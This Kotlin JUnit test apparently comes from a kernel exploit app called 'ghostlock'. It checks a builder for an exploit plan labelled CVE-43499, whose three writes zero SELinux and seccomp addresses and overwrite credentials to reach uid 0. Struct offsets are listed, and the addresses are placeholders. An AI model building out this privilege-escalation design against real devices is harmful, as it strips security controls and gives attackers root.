package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.core.steps.StepId
import com.ghostlock.app.engine.ktstep.LayoutInputs
import com.ghostlock.app.engine.ktstep.LockFields
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.PayloadSlots
import com.ghostlock.app.engine.ktstep.PayloadValues
import com.ghostlock.app.engine.ktstep.TaskFields
import com.ghostlock.app.engine.ktstep.WaiterFields
import com.ghostlock.app.engine.ktstep.WriteMode
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class Cve43499PlanBuilderTest {
    private fun inputs() = PayloadPageInputs(
        PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80),
        LockFields(0, 8, 16, 24),
        WaiterFields(0, 8, 16, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48, 0x50),
        TaskFields(0x40, 0x84, 0x8C, 0x90C, 0x920, 0x930, 0x938, 0x348),
        PayloadValues(0x100, 120, 140),
        0x1180, 0x1280, 0x0E80, 0x930, 0x348, 0x930, 8,
    )

    @Test
    fun buildsTheSharedW1W2W3Shape() {
        val layout = LayoutInputs(1, 2, 3, 4, 8)
        val plan = Cve43499PlanBuilder.build(
            Cve43499PlanTargets(
                selinuxAddress = 0xAA, credentialAddress = 0xBB, seccompAddress = 0xCC,
                credentialValue = 0xDD, layoutInputs = layout, pageInputs = inputs(),
                pageSize = 0x8000, expectedUid = 0,
            ),
        )
        assertEquals(0xAA, plan.steps.getValue(StepId.W1).target)
        assertEquals(WriteMode.Zero, plan.steps.getValue(StepId.W1).mode)
        assertTrue(plan.steps.getValue(StepId.W1).preserveChild)
        assertEquals(0xBB, plan.steps.getValue(StepId.W2).target)
        assertEquals(WriteMode.Credential, plan.steps.getValue(StepId.W2).mode)
        assertEquals(0xDD, plan.steps.getValue(StepId.W2).value)
        assertEquals(0xCC, plan.steps.getValue(StepId.W3).target)
        assertEquals(WriteMode.Zero, plan.steps.getValue(StepId.W3).mode)
        assertEquals(0x8000, plan.pageSize)
    }
}
